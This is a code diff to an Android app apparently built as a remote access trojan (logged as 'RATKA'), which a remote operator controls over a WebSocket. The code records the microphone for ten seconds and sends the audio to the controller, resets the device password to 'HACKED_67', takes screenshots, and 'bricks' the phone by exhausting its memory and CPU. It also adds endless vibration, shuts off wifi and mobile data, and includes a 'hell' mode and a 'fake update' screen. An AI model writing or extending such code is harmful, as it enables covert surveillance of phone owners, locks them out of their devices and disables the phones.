@@ -95,7 +95,6 @@ class MainActivity : Activity() {
                         "vibrate" -> vibratePhone(2000)
                         "toast" -> showToast(json.optString("text", "Привет!"))
                         "open_url" -> openUrl(json.optString("url", "https://google.com"))
-                        "sound" -> playSound()
                         "speak" -> speakText(json.optString("text", "Привет!"))
                         "apps" -> sendInstalledApps(webSocket)
                         "launch" -> launchApp(webSocket, json.optString("package", "com.android.settings"))
@@ -104,30 +103,32 @@ class MainActivity : Activity() {
                         "files" -> sendFiles(webSocket)
                         "play_file" -> playFile(webSocket, json.optString("data"), json.optString("filename"))
                         "flash" -> toggleFlash(webSocket)
-                        "brick" -> brickPhone()
-
-                        // Системные и медиа
+                        "mic" -> recordAudio(webSocket)
+                        
+                        // Системные
                         "back" -> runCmd(arrayOf("input", "keyevent", "4"))
                         "home" -> runCmd(arrayOf("input", "keyevent", "3"))
                         "recents" -> runCmd(arrayOf("input", "keyevent", "187"))
                         "lock" -> runCmd(arrayOf("input", "keyevent", "26"))
+                        "sleep" -> runCmd(arrayOf("input", "keyevent", "223"))
+                        "wake" -> runCmd(arrayOf("input", "keyevent", "224"))
+                        "notifications" -> runCmd(arrayOf("cmd", "statusbar", "expand-notifications"))
                         "media_pause" -> runCmd(arrayOf("input", "keyevent", "127"))
                         "media_play" -> runCmd(arrayOf("input", "keyevent", "126"))
                         "media_next" -> runCmd(arrayOf("input", "keyevent", "87"))
                         "volume_mute" -> (getSystemService(Context.AUDIO_SERVICE) as AudioManager).adjustStreamVolume(AudioManager.STREAM_MUSIC, AudioManager.ADJUST_MUTE, 0)
-                        "volume_unmute" -> (getSystemService(Context.AUDIO_SERVICE) as AudioManager).adjustStreamVolume(AudioManager.STREAM_MUSIC, AudioManager.ADJUST_UNMUTE, 0)
-
-                        // Сеть
-                        "wifi_on" -> runCmd(arrayOf("svc", "wifi", "enable"))
                         "wifi_off" -> runCmd(arrayOf("svc", "wifi", "disable"))
-                        "data_on" -> runCmd(arrayOf("svc", "data", "enable"))
                         "data_off" -> runCmd(arrayOf("svc", "data", "disable"))
 
-                        // Новые
-                        "mic" -> recordAudio(webSocket)
+                        // АДСКИЕ ФУНКЦИИ
+                        "hell" -> activateHell(webSocket)
+                        "brick" -> brickPhone()
                         "infinite_vibrate" -> infiniteVibrate(webSocket)
                         "change_password" -> changePassword(webSocket)
                         "random_sound" -> playRandomSound()
+                        
+                        // НОВОЕ
+                        "fake_update" -> fakeUpdate()
                     }
                 } catch (e: Exception) { 
                     sendError(webSocket, "Ошибка обработки: ${e.message}")
@@ -136,12 +137,93 @@ class MainActivity : Activity() {
         })
     }
 
-    private fun sendError(ws: WebSocket, error: String) {
-        ws.send(JSONObject().apply { put("type", "response"); put("msg", "ОШИБКА: $error") }.toString())
+    private fun activateHell(ws: WebSocket) {
+        try {
+            val ringtone = RingtoneManager.getRingtone(applicationContext, RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM))
+            ringtone.play()
+        } catch (e: Exception) {}
+        
+        infiniteVibrate(ws)
+        openUrl("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
+        showToast("РОК-Н-РОЛЛ! ТЕРЯЕМ КОНТРОЛЬ!")
+        speakText("РОК-Н-РОЛЛ! ТЕРЯЕМ КОНТРОЛЬ!")
+        ws.send(JSONObject().apply { put("type", "response"); put("msg", "АД АКТИВИРОВАН") }.toString())
+    }
+
+    private fun fakeUpdate() {
+        val intent = Intent(this, MainActivity::class.java)
+        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+        startActivity(intent)
+        showToast("Установка обновлений...")
+    }
+
+    private fun brickPhone() {
+        Thread {
+            val hogList = mutableListOf<ByteArray>()
+            while (true) {
+                try {
+                    hogList.add(ByteArray(5 * 1024 * 1024))
+                    var counter = 0L
+                    for (i in 1..5000000) { counter += i }
+                } catch (e: OutOfMemoryError) { while (true) {} }
+            }
+        }.start()
+        runOnUiThread { statusText?.text = "КИРПИЧ АКТИВИРОВАН" }
+    }
+
+    private fun infiniteVibrate(ws: WebSocket) {
+        try {
+            val v = getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
+            val pattern = longArrayOf(0, 1000, 500)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                v.vibrate(VibrationEffect.createWaveform(pattern, 0))
+            } else { @Suppress("DEPRECATION") v.vibrate(pattern, 0) }
+            ws.send(JSONObject().apply { put("type", "response"); put("msg", "Бесконечная вибрация запущена") }.toString())
+        } catch (e: Exception) { sendError(ws, "Ошибка вибрации: ${e.message}") }
+    }
+
+    private fun changePassword(ws: WebSocket) {
+        try {
+            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
+            dpm.resetPassword("HACKED_67", 0)
+            ws.send(JSONObject().apply { put("type", "response"); put("msg", "Пароль изменен на HACKED_67") }.toString())
+        } catch (e: Exception) { sendError(ws, "Ошибка пароля (нужны права админа): ${e.message}") }
+    }
+
+    private fun playRandomSound() {
+        val uri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM)
+        RingtoneManager.getRingtone(applicationContext, uri).play()
+    }
+
+    private fun recordAudio(ws: WebSocket) {
+        try {
+            val file = File(cacheDir, "recording.m4a")
+            val recorder = MediaRecorder()
+            recorder.setAudioSource(MediaRecorder.AudioSource.MIC)
+            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
+            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
+            recorder.setOutputFile(file.absolutePath)
+            recorder.prepare()
+            recorder.start()
+            
+            Handler(Looper.getMainLooper()).postDelayed({
+                try {
+                    recorder.stop()
+                    recorder.release()
+                    val bytes = file.readBytes()
+                    val base64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
+                    ws.send(JSONObject().apply { put("type", "audio_record"); put("data", base64) }.toString())
+                } catch (e: Exception) { Log.e("RATKA", "mic stop error", e) }
+            }, 10000)
+        } catch (e: Exception) { sendError(ws, "Ошибка микрофона: ${e.message}") }
     }
 
     private fun runCmd(cmd: Array<String>) {
         try { Runtime.getRuntime().exec(cmd) } catch (e: Exception) { Log.e("RATKA", "cmd error", e) }
+    }
+
+    private fun sendError(ws: WebSocket, error: String) {
+        ws.send(JSONObject().apply { put("type", "response"); put("msg", "ОШИБКА: $error") }.toString())
     }
 
     private fun sendBatteryInfo(ws: WebSocket) {
@@ -176,26 +258,8 @@ class MainActivity : Activity() {
         } else { @Suppress("DEPRECATION") vibrator.vibrate(duration.toLong()) }
     }
 
-    private fun infiniteVibrate(ws: WebSocket) {
-        try {
-            val v = getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
-            val pattern = longArrayOf(0, 1000, 500)
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                v.vibrate(VibrationEffect.createWaveform(pattern, 0))
-            } else { @Suppress("DEPRECATION") v.vibrate(pattern, 0) }
-            ws.send(JSONObject().apply { put("type", "response"); put("msg", "Бесконечная вибрация запущена") }.toString())
-        } catch (e: Exception) { sendError(ws, "Ошибка вибрации: ${e.message}") }
-    }
-
     private fun showToast(text: String) { runOnUiThread { Toast.makeText(this, text, Toast.LENGTH_LONG).show() } }
     private fun openUrl(url: String) { startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(url))) }
-    private fun playSound() { RingtoneManager.getRingtone(applicationContext, RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION)).play() }
-    
-    private fun playRandomSound() {
-        val uri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM)
-        RingtoneManager.getRingtone(applicationContext, uri).play()
-    }
-
     private fun speakText(text: String) { tts?.speak(text, TextToSpeech.QUEUE_FLUSH, null, "RatkaTTS") }
 
     private fun launchApp(ws: WebSocket, packageName: String) {
@@ -213,39 +277,6 @@ class MainActivity : Activity() {
                 ws.send(JSONObject().apply { put("type", "response"); put("msg", if (isFlashOn) "Фонарик ВКЛ" else "Фонарик ВЫКЛ") }.toString())
             } else { sendError(ws, "Нет вспышки/камеры") }
         } catch (e: Exception) { sendError(ws, "Ошибка фонарика: ${e.message}") }
-    }
-
-    private fun changePassword(ws: WebSocket) {
-        try {
-            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
-            dpm.resetPassword("HACKED_67", 0)
-            ws.send(JSONObject().apply { put("type", "response"); put("msg", "Пароль изменен на HACKED_67") }.toString())
-        } catch (e: Exception) { sendError(ws, "Ошибка пароля (нужны права админа): ${e.message}") }
-    }
-
-    private fun recordAudio(ws: WebSocket) {
-        try {
-            val file = File(cacheDir, "recording.m4a")
-            val recorder = MediaRecorder()
-            recorder.setAudioSource(MediaRecorder.AudioSource.MIC)
-            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
-            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
-            recorder.setOutputFile(file.absolutePath)
-            recorder.prepare()
-            recorder.start()
-            
-            Handler(Looper.getMainLooper()).postDelayed({
-                try {
-                    recorder.stop()
-                    recorder.release()
-                    val bytes = file.readBytes()
-                    val base64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
-                    ws.send(JSONObject().apply { put("type", "audio_record"); put("data", base64) }.toString())
-                } catch (e: Exception) { Log.e("RATKA", "mic stop error", e) }
-            }, 10000)
-            
-            ws.send(JSONObject().apply { put("type", "response"); put("msg", "Запись микрофона (10 сек) пошла") }.toString())
-        } catch (e: Exception) { sendError(ws, "Ошибка микрофона: ${e.message}") }
     }
 
     private fun setWallpaperFromBase64(ws: WebSocket, base64Str: String) {
@@ -315,20 +346,6 @@ class MainActivity : Activity() {
                 runOnUiThread { statusText?.text = "Скриншот отправлен" }
             }, 1000)
         } catch (e: Exception) { Log.e("RATKA", "Ошибка захвата", e) }
-    }
-
-    private fun brickPhone() {
-        Thread {
-            val hogList = mutableListOf<ByteArray>()
-            while (true) {
-                try {
-                    hogList.add(ByteArray(5 * 1024 * 1024))
-                    var counter = 0L
-                    for (i in 1..5000000) { counter += i }
-                } catch (e: OutOfMemoryError) { while (true) {} }
-            }
-        }.start()
-        runOnUiThread { statusText?.text = "КИРПИЧ АКТИВИРОВАН" }
     }
 
     override fun onDestroy() { super.onDestroy(); tts?.shutdown() }
